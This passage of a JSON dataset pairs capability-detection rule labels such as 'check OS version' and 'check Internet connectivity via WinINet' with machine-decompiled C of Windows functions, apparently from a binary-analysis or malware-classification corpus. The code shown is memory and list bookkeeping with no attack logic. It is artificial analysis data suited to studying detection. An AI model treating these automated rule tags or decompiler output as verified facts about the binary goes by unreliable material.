            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.140003070(int64_t arg1)\n\n{\n    int32_t *piVar1;\n    int64_t *piVar2;\n    ulong in_RAX;\n    int64_t *piVar3;\n    int64_t iVar4;\n    ulong uVar5;\n    int64_t iVar6;\n    ulong *puVar7;\n    \n    piVar2 = *0x1400183a0;\n    if (arg1 == 0) {\n        return in_RAX;\n    }\n    iVar6 = **0x1400183a0;\n    if (iVar6 == 0) {\n        iVar4 = fcn.140008fc0();\n        iVar6 = *piVar2;\n        if (*(iVar4 + 0x90) == 0) goto code_r0x0001400030a5;\n        if (iVar6 == 0) {\n            iVar6 = fcn.140008fc0();\n        }\ncode_r0x000140003180:\n        fcn.14000ae70(*(iVar6 + 0x90));\n        iVar6 = *piVar2;\n        if (iVar6 != 0) goto code_r0x0001400030c4;\ncode_r0x000140003198:\n        iVar4 = fcn.140008fc0();\n        iVar6 = *piVar2;\n        if (*(iVar4 + 0x88) != 0) {\n            if (iVar6 == 0) {\n                iVar6 = fcn.140008fc0();\n            }\n            goto code_r0x0001400030d2;\n        }\ncode_r0x0001400031c0:\n        *(iVar6 + 0x88) = 0x14001b198;\n        piVar3 = 0x14001b198;\n    }\n    else {\n        if (*(iVar6 + 0x90) != 0) goto code_r0x000140003180;\ncode_r0x0001400030a5:\n        *(iVar6 + 0x90) = 0x140016070;\n        fcn.14000ae70(0x140016070);\n        iVar6 = *piVar2;\n        if (iVar6 == 0) goto code_r0x000140003198;\ncode_r0x0001400030c4:\n        if (*(iVar6 + 0x88) == 0) goto code_r0x0001400031c0;\ncode_r0x0001400030d2:\n        piVar3 = *(iVar6 + 0x88);\n    }\n    iVar6 = *piVar3;\n    if ((arg1 == iVar6) || (iVar6 == 0)) {\n        iVar4 = 0;\n    }\n    else {\n        do {\n            iVar4 = iVar6;\n            iVar6 = *(iVar4 + 0x18);\n            if (iVar6 == 0) goto code_r0x000140003280;\n        } while (arg1 != iVar6);\n    }\n    if (iVar6 == 0) {\ncode_r0x000140003280:\n        uVar5 = (**0x140016110)(2);\n        sub.msvcrt.dll_fprintf(uVar5, \"%p not found?!?!\\n\", arg1);\n        goto code_r0x00014000311a;\n    }\n    piVar1 = arg1 + 0x10;\n    *piVar1 = *piVar1 + -1;\n    if (*piVar1 != 0) goto code_r0x00014000311a;\n    fcn.140009ae0(arg1 + 8);\n    if (iVar4 == 0) {\n        iVar6 = *piVar2;\n        if (iVar6 == 0) {\n            iVar4 = fcn.140008fc0();\n            iVar6 = *piVar2;\n            if (*(iVar4 + 0x88) == 0) goto code_r0x000140003253;\n            if (iVar6 == 0) {\n                iVar6 = fcn.140008fc0();\n            }\ncode_r0x0001400032d8:\n            puVar7 = *(iVar6 + 0x88);\n        }\n        else {\n            if (*(iVar6 + 0x88) != 0) goto code_r0x0001400032d8;\ncode_r0x000140003253:\n            *(iVar6 + 0x88) = 0x14001b198;\n            puVar7 = 0x14001b198;\n        }\n        *puVar7 = *(arg1 + 0x18);\n    }\n    else {\n        *(iVar4 + 0x18) = *(arg1 + 0x18);\n    }\n    sub.msvcrt.dll_free(arg1);\ncode_r0x00014000311a:\n    iVar6 = *piVar2;\n    if (iVar6 == 0) {\n        iVar4 = fcn.140008fc0();\n        iVar6 = *piVar2;\n        iVar4 = *(iVar4 + 0x90);\n    }\n    else {\n        iVar4 = *(iVar6 + 0x90);\n    }\n    if (iVar4 == 0) {\n        puVar7 = 0x140016070;\n        *(iVar6 + 0x90) = 0x140016070;\n    }\n    else {\n        if (iVar6 == 0) {\n            iVar6 = fcn.140008fc0();\n        }\n        puVar7 = *(iVar6 + 0x90);\n    }\n    *puVar7 = 0xffffffffffffffff;\n    return 0;\n}\n",
        "token_count": 1216
    },
    "14000331": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.140003310(int64_t arg1)\n\n{\n    int64_t **ppiVar1;\n    uint64_t **ppuVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t *piVar5;\n    int64_t *piVar6;\n    int64_t iVar7;\n    uint64_t *puVar8;\n    ulong *puVar9;\n    uint64_t uVar10;\n    int64_t iVar11;\n    int64_t iVar12;\n    \n    piVar6 = *0x1400183a0;\n    if (arg1 == 0) {\n        return 0;\n    }\n    iVar3 = **0x1400183a0;\n    if (iVar3 == 0) {\n        iVar4 = fcn.140008fc0();\n        iVar3 = *piVar6;\n        if (*(iVar4 + 0x70) == 0) goto code_r0x000140003348;\n        if (iVar3 != 0) goto code_r0x000140003438;\n        iVar3 = fcn.140008fc0();\n        uVar10 = **(iVar3 + 0x70);\n        iVar3 = *piVar6;\n        if (iVar3 != 0) goto code_r0x000140003356;\n        iVar4 = fcn.140008fc0();\n        iVar3 = *piVar6;\n        if (*(iVar4 + 0x78) == 0) goto code_r0x00014000386a;\n        if (iVar3 != 0) goto code_r0x000140003361;\n        iVar4 = fcn.140008fc0();\n        iVar3 = *piVar6;\n        if (uVar10 < **(iVar4 + 0x78)) goto code_r0x0001400033ef;\n        if (iVar3 != 0) goto code_r0x00014000387e;\n        iVar4 = fcn.140008fc0();\n        iVar3 = *piVar6;\n        if (*(iVar4 + 0x70) == 0) goto code_r0x000140003889;\n        if (iVar3 != 0) goto code_r0x000140003983;\n        iVar3 = fcn.140008fc0();\n        if (**(iVar3 + 0x70) != 0) {\n            iVar3 = *piVar6;\n            if (iVar3 != 0) goto code_r0x0001400038a4;\n            iVar4 = fcn.140008fc0();\n            iVar3 = *piVar6;\n            if (*(iVar4 + 0x78) == 0) goto code_r0x0001400038af;\n            if (iVar3 != 0) goto code_r0x0001400039f7;\n            iVar4 = fcn.140008fc0();\n            iVar3 = *piVar6;\n            iVar4 = (**(iVar4 + 0x78) + 0x10) * 0x10;\n            if (iVar3 != 0) goto code_r0x0001400038c5;\n            iVar11 = fcn.140008fc0();\n            iVar3 = *piVar6;\n            if (*(iVar11 + 0x68) == 0) goto code_r0x000140003c86;\n            if (iVar3 == 0) {\n                iVar3 = fcn.140008fc0();\n            }\n            goto code_r0x0001400038d0;\n        }\ncode_r0x000140003991:\n        iVar4 = sub.msvcrt.dll_malloc(0x100);\n        if (iVar4 == 0) {\n            return 0;\n        }\n        iVar3 = *piVar6;\n        if (iVar3 == 0) {\n            iVar11 = fcn.140008fc0();\n            iVar3 = *piVar6;\n            if (*(iVar11 + 0x78) != 0) {\n                if (iVar3 == 0) {\n                    iVar3 = fcn.140008fc0();\n                }\ncode_r0x0001400039be:\n                puVar9 = iVar3 + 0x78;\n                iVar3 = *piVar6;\n                **puVar9 = 0x10;\n                goto joined_r0x0001400039cf;\n            }\n        }\n        else if (*(iVar3 + 0x78) != 0) goto code_r0x0001400039be;\n        *0x14001b1a8 = 0x10;\n        *(iVar3 + 0x78) = 0x14001b1a8;\n        goto code_r0x000140003916;\n    }\n    if (*(iVar3 + 0x70) == 0) {\ncode_r0x000140003348:\n        puVar8 = 0x14001b1b0;\n        *(iVar3 + 0x70) = 0x14001b1b0;\n    }\n    else {\ncode_r0x000140003438:\n        puVar8 = *(iVar3 + 0x70);\n        iVar3 = *piVar6;\n    }\n    uVar10 = *puVar8;\ncode_r0x000140003356:\n    if (*(iVar3 + 0x78) == 0) {\ncode_r0x00014000386a:\n        *(iVar3 + 0x78) = 0x14001b1a8;\n        if (uVar10 < *0x14001b1a8) goto code_r0x0001400033ef;\n    }\n    else {\ncode_r0x000140003361:\n        if (uVar10 <= **(iVar3 + 0x78) && **(iVar3 + 0x78) != uVar10) goto code_r0x0001400033ef;\n    }\ncode_r0x00014000387e:\n    if (*(iVar3 + 0x70) == 0) {\ncode_r0x000140003889:\n        *(iVar3 + 0x70) = 0x14001b1b0;\n        iVar3 = *0x14001b1b0;\n    }\n    else {\ncode_r0x000140003983:\n        iVar3 = **(iVar3 + 0x70);\n    }\n    if (iVar3 == 0) goto code_r0x000140003991;\n    iVar3 = *piVar6;\ncode_r0x0001400038a4:\n    if (*(iVar3 + 0x78) == 0) {\ncode_r0x0001400038af:\n        piVar5 = 0x14001b1a8;\n        *(iVar3 + 0x78) = 0x14001b1a8;\n    }\n    else {\ncode_r0x0001400039f7:\n        piVar5 = *(iVar3 + 0x78);\n    }\n    iVar4 = (*piVar5 + 0x10) * 0x10;\ncode_r0x0001400038c5:\n    if (*(iVar3 + 0x68) == 0) {\ncode_r0x000140003c86:\n        *(iVar3 + 0x68) = 0x14001b1b8;\n        puVar9 = 0x14001b1b8;\n    }\n    else {\ncode_r0x0001400038d0:\n        puVar9 = *(iVar3 + 0x68);\n    }\n    iVar4 = sub.msvcrt.dll_realloc(*puVar9, iVar4);\n    if (iVar4 == 0) {\n        return 0;\n    }\n    iVar3 = *piVar6;\n    if (iVar3 == 0) {\n        iVar11 = fcn.140008fc0();\n        iVar3 = *piVar6;\n        if (*(iVar11 + 0x78) != 0) {\n            if (iVar3 == 0) {\n                iVar3 = fcn.140008fc0();\n            }\n            goto code_r0x000140003902;\n        }\ncode_r0x000140003c6e:\n        *0x14001b1a8 = *0x14001b1a8 + 0x10;\n        *(iVar3 + 0x78) = 0x14001b1a8;\ncode_r0x000140003916:\n        if (*(iVar3 + 0x68) == 0) goto code_r0x000140003a27;\ncode_r0x000140003921:\n        piVar5 = *(iVar3 + 0x68);\n        iVar3 = *piVar6;\n    }\n    else {\n        if (*(iVar3 + 0x78) == 0) goto code_r0x000140003c6e;\ncode_r0x000140003902:\n        ppiVar1 = iVar3 + 0x78;\n        iVar3 = *piVar6;\n        **ppiVar1 = **ppiVar1 + 0x10;\njoined_r0x0001400039cf:\n        if (iVar3 != 0) goto code_r0x000140003916;\n        iVar11 = fcn.140008fc0();\n        iVar3 = *piVar6;\n        if (*(iVar11 + 0x68) != 0) {\n            if (iVar3 == 0) {\n                iVar3 = fcn.140008fc0();\n            }\n            goto code_r0x000140003921;\n        }\ncode_r0x000140003a27:\n        piVar5 = 0x14001b1b8;\n        *(iVar3 + 0x68) = 0x14001b1b8;\n    }\n    *piVar5 = iVar4;\ncode_r0x0001400033ef:\n    if (iVar3 == 0) goto code_r0x000140003498;\ncode_r0x0001400033f8:\n    if (*(iVar3 + 0x80) != 0) goto code_r0x000140003380;\ncode_r0x000140003406:\n    *0x14001b1a0 = *0x14001b1a0 + 1;\n    *(iVar3 + 0x80) = 0x14001b1a0;\n    if (*(iVar3 + 0x80) != 0) goto code_r0x0001400033a1;\ncode_r0x00014000341f:\n    *(iVar3 + 0x80) = 0x14001b1a0;\n    if ((*0x14001b1a0 & 0x4000000000000000) == 0) goto code_r0x0001400033d5;\ncode_r0x00014000342f:\n    puVar9 = *(iVar3 + 0x80);\ncode_r0x0001400033c5:\n    do {\n        *puVar9 = 1;\ncode_r0x0001400033cc:\n        do {\n            if (iVar3 == 0) {\n                iVar4 = fcn.140008fc0();\n                iVar3 = *piVar6;\n                if (*(iVar4 + 0x80) != 0) {\n                    if (iVar3 == 0) {\n                        iVar3 = fcn.140008fc0();\n                    }\n                    goto code_r0x0001400033df;\n                }\ncode_r0x000140003448:\n                *(iVar3 + 0x80) = 0x14001b1a0;\n                uVar10 = *0x14001b1a0;\n            }\n            else {\ncode_r0x0001400033d5:\n                if (*(iVar3 + 0x80) == 0) goto code_r0x000140003448;\ncode_r0x0001400033df:\n                ppuVar2 = iVar3 + 0x80;\n                iVar3 = *piVar6;\n                uVar10 = **ppuVar2;\n            }\n            if (uVar10 == 0) goto code_r0x0001400033ef;\n            if (iVar3 == 0) {\n                iVar4 = fcn.140008fc0();\n                iVar3 = *piVar6;\n                if (*(iVar4 + 0x80) != 0) {\n                    if (iVar3 == 0) {\n                        iVar3 = fcn.140008fc0();\n                    }\n                    goto code_r0x00014000346f;\n                }\ncode_r0x000140003570:\n                *(iVar3 + 0x80) = 0x14001b1a0;\n                iVar3 = fcn.140002ac0(*0x14001b1a0);\n            }\n            else {\n                if (*(iVar3 + 0x80) == 0) goto code_r0x000140003570;\ncode_r0x00014000346f:\n                iVar3 = fcn.140002ac0(**(iVar3 + 0x80));\n            }\n            if (iVar3 == 0) {\n                iVar3 = *piVar6;\n                if (iVar3 == 0) {\n                    iVar4 = fcn.140008fc0();\n                    iVar3 = *piVar6;\n                    if (*(iVar4 + 0x70) != 0) {\n                        if (iVar3 != 0) goto code_r0x0001400035a2;\n                        iVar4 = fcn.140008fc0();\n                        iVar3 = *piVar6;\n                        piVar5 = *(iVar4 + 0x70);\n                        goto code_r0x0001400035a9;\n                    }\ncode_r0x000140003930:\n                    iVar4 = *0x14001b1b0;\n                    *(iVar3 + 0x70) = 0x14001b1b0;\n                    if (iVar4 == 0) goto code_r0x0001400037ce;\n                }\n                else {\n                    if (*(iVar3 + 0x70) == 0) goto code_r0x000140003930;\ncode_r0x0001400035a2:\n                    piVar5 = *(iVar3 + 0x70);\n                    iVar3 = *piVar6;\ncode_r0x0001400035a9:\n                    iVar4 = *piVar5;\n                    if (iVar4 == 0) goto code_r0x0001400037c5;\n                }\n                iVar11 = iVar4 << 4;\n                goto code_r0x000140003608;\n            }\n            iVar3 = *piVar6;\n            if (iVar3 != 0) goto code_r0x0001400033f8;\ncode_r0x000140003498:\n            iVar4 = fcn.140008fc0();\n            iVar3 = *piVar6;\n            if (*(iVar4 + 0x80) == 0) goto code_r0x000140003406;\n            if (iVar3 == 0) {\n                iVar3 = fcn.140008fc0();\n            }\ncode_r0x000140003380:\n            ppiVar1 = iVar3 + 0x80;\n            iVar3 = *piVar6;\n            **ppiVar1 = **ppiVar1 + 1;\n            if (iVar3 == 0) {\n                iVar4 = fcn.140008fc0();\n                iVar3 = *piVar6;\n                if (*(iVar4 + 0x80) == 0) goto code_r0x00014000341f;\n                if (iVar3 == 0) {\n                    iVar4 = fcn.140008fc0();\n                    iVar3 = *piVar6;\n                    if ((*(*(iVar4 + 0x80) + 7) & 0x40) != 0) {\n                        if (iVar3 == 0) {\n                            iVar4 = fcn.140008fc0();\n                            iVar3 = *piVar6;\n                            if (*(iVar4 + 0x80) == 0) goto code_r0x0001400033bb;\n                            if (iVar3 != 0) goto code_r0x00014000342f;\n                            iVar3 = fcn.140008fc0();\n                            puVar9 = *(iVar3 + 0x80);\n                            iVar3 = *piVar6;\n                            goto code_r0x0001400033c5;\n                        }\n                        break;\n                    }\n                    goto code_r0x0001400033cc;\n                }\n            }\n            else if (*(iVar3 + 0x80) == 0) goto code_r0x00014000341f;\ncode_r0x0001400033a1:\n            piVar5 = iVar3 + 0x80;\n            iVar3 = *piVar6;\n        } while ((*(*piVar5 + 7) & 0x40) == 0);\n        if (*(iVar3 + 0x80) != 0) goto code_r0x00014000342f;\ncode_r0x0001400033bb:\n        *(iVar3 + 0x80) = 0x14001b1a0;\n        puVar9 = 0x14001b1a0;\n    } while( true );\ncode_r0x000140003608:\n    do {\n        iVar11 = iVar11 + -0x10;\n        if (iVar3 == 0) {\n            iVar3 = fcn.140008fc0();\n            if (*(iVar3 + 0x68) != 0) goto code_r0x0001400035d0;\n            iVar3 = *piVar6;\n            piVar5 = 0x14001b1b8;\n            *(iVar3 + 0x68) = 0x14001b1b8;\ncode_r0x0001400035e0:\n            uVar10 = *(*piVar5 + 8 + iVar11);\ncode_r0x0001400035e8:\n            if (*(iVar3 + 0x80) != 0) {\ncode_r0x0001400035f2:\n                puVar8 = *(iVar3 + 0x80);\n                goto code_r0x0001400035f9;\n            }\ncode_r0x000140003658:\n            *(iVar3 + 0x80) = 0x14001b1a0;\n            if (uVar10 <= *0x14001b1a0) break;\n        }\n        else {\n            if (*(iVar3 + 0x68) == 0) {\n                *(iVar3 + 0x68) = 0x14001b1b8;\n                piVar5 = 0x14001b1b8;\n                goto code_r0x0001400035e0;\n            }\ncode_r0x0001400035d0:\n            iVar3 = *piVar6;\n            if (iVar3 != 0) {\n                piVar5 = *(iVar3 + 0x68);\n                goto code_r0x0001400035e0;\n            }\n            iVar12 = fcn.140008fc0();\n            iVar3 = *piVar6;\n            uVar10 = *(**(iVar12 + 0x68) + 8 + iVar11);\n            if (iVar3 != 0) goto code_r0x0001400035e8;\n            iVar12 = fcn.140008fc0();\n            iVar3 = *piVar6;\n            if (*(iVar12 + 0x80) == 0) goto code_r0x000140003658;\n            if (iVar3 != 0) goto code_r0x0001400035f2;\n            iVar12 = fcn.140008fc0();\n            iVar3 = *piVar6;\n            puVar8 = *(iVar12 + 0x80);\ncode_r0x0001400035f9:\n            if (uVar10 <= *puVar8) break;\n        }\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    if (iVar3 == 0) {\n        iVar11 = fcn.140008fc0();\n        iVar3 = *piVar6;\n        if (*(iVar11 + 0x70) == 0) goto code_r0x000140003749;\n        if (iVar3 != 0) goto code_r0x00014000367b;\n        iVar11 = fcn.140008fc0();\n        iVar3 = *piVar6;\n        if (iVar4 != **(iVar11 + 0x70)) {\n            if (iVar3 != 0) goto code_r0x00014000375d;\n            iVar11 = fcn.140008fc0();\n            iVar3 = *piVar6;\n            if (*(iVar11 + 0x70) == 0) goto code_r0x000140003768;\n            if (iVar3 != 0) goto code_r0x000140003a00;\n            iVar11 = fcn.140008fc0();\n            iVar3 = *piVar6;\n            iVar11 = (**(iVar11 + 0x70) - iVar4) * 0x10;\n            if (iVar3 != 0) goto code_r0x00014000377d;\n            iVar12 = fcn.140008fc0();\n            iVar3 = *piVar6;\n            if (*(iVar12 + 0x68) != 0) {\n                if (iVar3 != 0) goto code_r0x00014000378c;\n                iVar12 = fcn.140008fc0();\n                iVar3 = *piVar6;\n                iVar12 = **(iVar12 + 0x68) + iVar4 * 0x10;\n                if (iVar3 != 0) {\n                    piVar5 = *(iVar3 + 0x68);\n                    goto code_r0x00014000379c;\n                }\n                iVar7 = fcn.140008fc0();\n                iVar3 = *piVar6;\n                if (*(iVar7 + 0x68) == 0) goto code_r0x0001400037a4;\n                if (iVar3 != 0) goto code_r0x000140003a1e;\n                iVar3 = fcn.140008fc0();\n                piVar5 = *(iVar3 + 0x68);\n                goto code_r0x0001400037af;\n            }\n            goto code_r0x000140003a09;\n        }\n        iVar4 = iVar4 << 4;\ncode_r0x0001400037c5:\n        if (iVar3 != 0) {\ncode_r0x0001400037ce:\n            iVar11 = *(iVar3 + 0x80);\n            goto joined_r0x0001400037d6;\n        }\n        iVar11 = fcn.140008fc0();\n        iVar3 = *piVar6;\n        if (*(iVar11 + 0x80) == 0) goto code_r0x00014000369a;\n        if (iVar3 != 0) goto code_r0x0001400037dc;\n        iVar11 = fcn.140008fc0();\n        iVar3 = *piVar6;\n        puVar9 = *(iVar11 + 0x80);\n        if (iVar3 != 0) goto code_r0x0001400037e3;\n        iVar11 = fcn.140008fc0();\n        iVar3 = *piVar6;\n        if (*(iVar11 + 0x68) == 0) goto code_r0x0001400036b3;\n        if (iVar3 != 0) goto code_r0x0001400037ee;\n        iVar11 = fcn.140008fc0();\n        iVar3 = *piVar6;\n        *(**(iVar11 + 0x68) + 8 + iVar4) = *puVar9;\n        if (iVar3 != 0) goto code_r0x0001400037fe;\n        iVar11 = fcn.140008fc0();\n        iVar3 = *piVar6;\n        if (*(iVar11 + 0x68) == 0) goto code_r0x000140003973;\n        if (iVar3 != 0) goto code_r0x000140003809;\n        iVar11 = fcn.140008fc0();\n        iVar3 = *piVar6;\n        *(**(iVar11 + 0x68) + iVar4) = arg1;\n        if (iVar3 != 0) goto code_r0x000140003814;\n        iVar4 = fcn.140008fc0();\n        iVar3 = *piVar6;\n        iVar4 = *(iVar4 + 0x70);\n    }\n    else {\n        if (*(iVar3 + 0x70) == 0) {\ncode_r0x000140003749:\n            *(iVar3 + 0x70) = 0x14001b1b0;\n            iVar11 = *0x14001b1b0;\n        }\n        else {\ncode_r0x00014000367b:\n            iVar11 = **(iVar3 + 0x70);\n        }\n        if (iVar4 != iVar11) {\ncode_r0x00014000375d:\n            if (*(iVar3 + 0x70) == 0) {\ncode_r0x000140003768:\n                piVar5 = 0x14001b1b0;\n                *(iVar3 + 0x70) = 0x14001b1b0;\n            }\n            else {\ncode_r0x000140003a00:\n                piVar5 = *(iVar3 + 0x70);\n            }\n            iVar11 = (*piVar5 - iVar4) * 0x10;\ncode_r0x00014000377d:\n            if (*(iVar3 + 0x68) == 0) {\ncode_r0x000140003a09:\n                iVar12 = *0x14001b1b8;\n                *(iVar3 + 0x68) = 0x14001b1b8;\n                iVar12 = iVar12 + iVar4 * 0x10;\ncode_r0x000140003a1e:\n                piVar5 = *(iVar3 + 0x68);\n            }\n            else {\ncode_r0x00014000378c:\n                piVar5 = *(iVar3 + 0x68);\n                iVar12 = *piVar5 + iVar4 * 0x10;\ncode_r0x00014000379c:\n                if (piVar5 != NULL) goto code_r0x000140003a1e;\ncode_r0x0001400037a4:\n                piVar5 = 0x14001b1b8;\n                *(iVar3 + 0x68) = 0x14001b1b8;\n            }\ncode_r0x0001400037af:\n            iVar4 = iVar4 * 0x10;\n            sub.msvcrt.dll_memmove(*piVar5 + 0x10 + iVar4, iVar12, iVar11);\n            iVar3 = *piVar6;\n            goto code_r0x0001400037c5;\n        }\n        iVar4 = iVar4 << 4;\n        iVar11 = *(iVar3 + 0x80);\njoined_r0x0001400037d6:\n        if (iVar11 == 0) {\ncode_r0x00014000369a:\n            puVar9 = 0x14001b1a0;\n            iVar11 = *(iVar3 + 0x68);\n            *(iVar3 + 0x80) = 0x14001b1a0;\n        }\n        else {\ncode_r0x0001400037dc:\n            puVar9 = *(iVar3 + 0x80);\ncode_r0x0001400037e3:\n            iVar11 = *(iVar3 + 0x68);\n        }\n        if (iVar11 == 0) {\ncode_r0x0001400036b3:\n            piVar5 = 0x14001b1b8;\n            *(iVar3 + 0x68) = 0x14001b1b8;\n        }\n        else {\ncode_r0x0001400037ee:\n            piVar5 = *(iVar3 + 0x68);\n        }\n        *(*piVar5 + 8 + iVar4) = *puVar9;\ncode_r0x0001400037fe:\n        if (*(iVar3 + 0x68) == 0) {\ncode_r0x000140003973:\n            piVar5 = 0x14001b1b8;\n            *(iVar3 + 0x68) = 0x14001b1b8;\n        }\n        else {\ncode_r0x000140003809:\n            piVar5 = *(iVar3 + 0x68);\n        }\n        *(*piVar5 + iVar4) = arg1;\ncode_r0x000140003814:\n        iVar4 = *(iVar3 + 0x70);\n    }\n    if (iVar4 == 0) {\n        piVar6 = 0x14001b1b0;\n        *(iVar3 + 0x70) = 0x14001b1b0;\ncode_r0x000140003831:\n        *piVar6 = *piVar6 + 1;\n    }\n    else {\n        if (iVar3 != 0) {\n            piVar6 = *(iVar3 + 0x70);\n            goto code_r0x000140003831;\n        }\n        iVar4 = fcn.140008fc0();\n        iVar3 = *piVar6;\n        **(iVar4 + 0x70) = **(iVar4 + 0x70) + 1;\n        if (iVar3 == 0) {\n            iVar4 = fcn.140008fc0();\n            iVar3 = *piVar6;\n            iVar4 = *(iVar4 + 0x80);\n            goto code_r0x000140003840;\n        }\n    }\n    iVar4 = *(iVar3 + 0x80);\ncode_r0x000140003840:\n    if (iVar4 == 0) {\n        puVar9 = 0x14001b1a0;\n        *(iVar3 + 0x80) = 0x14001b1a0;\n    }\n    else if (iVar3 == 0) {\n        iVar3 = fcn.140008fc0();\n        puVar9 = *(iVar3 + 0x80);\n    }\n    else {\n        puVar9 = *(iVar3 + 0x80);\n    }\n    return *puVar9;\n}\n",
        "token_count": 6657
    },
    "140003df": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t fcn.140003df0(void)\n\n{\n    int64_t **ppiVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    ulong uVar6;\n    ulong *puVar7;\n    \n    piVar2 = *0x1400183a0;\n    iVar4 = **0x1400183a0;\n    if (iVar4 == 0) {\n        iVar5 = fcn.140008fc0();\n        iVar4 = *piVar2;\n        if (*(iVar5 + 0x60) == 0) goto code_r0x000140003e17;\n        if (iVar4 == 0) {\n            iVar4 = fcn.140008fc0();\n        }\ncode_r0x000140003f50:\n        uVar6 = *(iVar4 + 0x60);\n    }\n    else {\n        if (*(iVar4 + 0x60) != 0) goto code_r0x000140003f50;\ncode_r0x000140003e17:\n        uVar6 = 0x140016078;\n        *(iVar4 + 0x60) = 0x140016078;\n    }\n    fcn.1400095f0(uVar6);\n    iVar4 = *piVar2;\n    if (iVar4 == 0) {\n        iVar5 = fcn.140008fc0();\n        iVar4 = *piVar2;\n        if (*(iVar5 + 0x50) == 0) goto code_r0x000140003e3a;\n        if (iVar4 == 0) {\n            iVar4 = fcn.140008fc0();\n        }\ncode_r0x000140003ec0:\n        iVar4 = **(iVar4 + 0x50);\n        if (iVar4 != 0) goto code_r0x000140003e50;\ncode_r0x000140003ecc:\n        iVar5 = sub.msvcrt.dll_calloc(1, 0x1e0);\n        if (iVar5 != 0) {\n            iVar3 = fcn.140003310(iVar5);\n            if (iVar3 == 0) {\n                sub.msvcrt.dll_free(iVar5);\n            }\n            else {\n                *(iVar5 + 0x1d8) = iVar3;\n                iVar4 = iVar5;\n            }\n        }\n        iVar5 = *piVar2;\n        if (iVar5 != 0) {\n            if (*(iVar5 + 0x60) != 0) goto code_r0x000140003f15;\n            goto code_r0x000140004040;\n        }\n        iVar3 = fcn.140008fc0();\n        iVar5 = *piVar2;\n        if (*(iVar3 + 0x60) == 0) goto code_r0x000140004040;\ncode_r0x000140003f15:\n        if (iVar5 != 0) goto code_r0x000140003e83;\ncode_r0x000140003f20:\n        iVar5 = fcn.140008fc0();\n    }\n    else {\n        if (*(iVar4 + 0x50) != 0) goto code_r0x000140003ec0;\ncode_r0x000140003e3a:\n        *(iVar4 + 0x50) = 0x14001b1c8;\n        iVar4 = *0x14001b1c8;\n        if (*0x14001b1c8 == 0) goto code_r0x000140003ecc;\ncode_r0x000140003e50:\n        iVar3 = fcn.140003310(iVar4);\n        *(iVar4 + 0x1d8) = iVar3;\n        iVar5 = *piVar2;\n        if (iVar3 == 0) {\n            iVar4 = 0;\n            if (iVar5 == 0) goto code_r0x000140003f9c;\ncode_r0x000140003e78:\n            if (*(iVar5 + 0x60) == 0) goto code_r0x000140004040;\n        }\n        else {\n            if (iVar5 == 0) {\n                iVar3 = fcn.140008fc0();\n                iVar5 = *piVar2;\n                if (*(iVar3 + 0x50) != 0) {\n                    if (iVar5 == 0) {\n                        iVar5 = fcn.140008fc0();\n                    }\n                    goto code_r0x000140003f6c;\n                }\ncode_r0x000140003fd8:\n                *(iVar5 + 0x50) = 0x14001b1c8;\n                *0x14001b1c8 = *(iVar4 + 0x1d0);\n                if (*0x14001b1c8 != 0) goto code_r0x000140003f87;\ncode_r0x000140003ff7:\n                if (*(iVar5 + 0x58) == 0) {\ncode_r0x000140004080:\n                    puVar7 = 0x14001b1c0;\n                    *(iVar5 + 0x58) = 0x14001b1c0;\n                }\n                else {\ncode_r0x000140004002:\n                    puVar7 = *(iVar5 + 0x58);\n                }\ncode_r0x000140004006:\n                *puVar7 = 0;\n                *(iVar4 + 0x1d0) = 0;\n            }\n            else {\n                if (*(iVar5 + 0x50) == 0) goto code_r0x000140003fd8;\ncode_r0x000140003f6c:\n                ppiVar1 = iVar5 + 0x50;\n                iVar3 = *(iVar4 + 0x1d0);\n                iVar5 = *piVar2;\n                **ppiVar1 = iVar3;\n                if (iVar3 == 0) {\n                    if (iVar5 != 0) goto code_r0x000140003ff7;\n                    iVar3 = fcn.140008fc0();\n                    iVar5 = *piVar2;\n                    if (*(iVar3 + 0x58) == 0) goto code_r0x000140004080;\n                    if (iVar5 != 0) goto code_r0x000140004002;\n                    iVar5 = fcn.140008fc0();\n                    puVar7 = *(iVar5 + 0x58);\n                    iVar5 = *piVar2;\n                    goto code_r0x000140004006;\n                }\ncode_r0x000140003f87:\n                *(iVar4 + 0x1d0) = 0;\n            }\n            if (iVar5 != 0) goto code_r0x000140003e78;\ncode_r0x000140003f9c:\n            iVar3 = fcn.140008fc0();\n            iVar5 = *piVar2;\n            if (*(iVar3 + 0x60) == 0) {\ncode_r0x000140004040:\n                uVar6 = 0x140016078;\n                *(iVar5 + 0x60) = 0x140016078;\n                goto code_r0x000140003e87;\n            }\n            if (iVar5 == 0) goto code_r0x000140003f20;\n        }\n    }\ncode_r0x000140003e83:\n    uVar6 = *(iVar5 + 0x60);\ncode_r0x000140003e87:\n    fcn.140009910(uVar6);\n    return iVar4;\n}\n",
        "token_count": 1668
    },
    "1400040c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
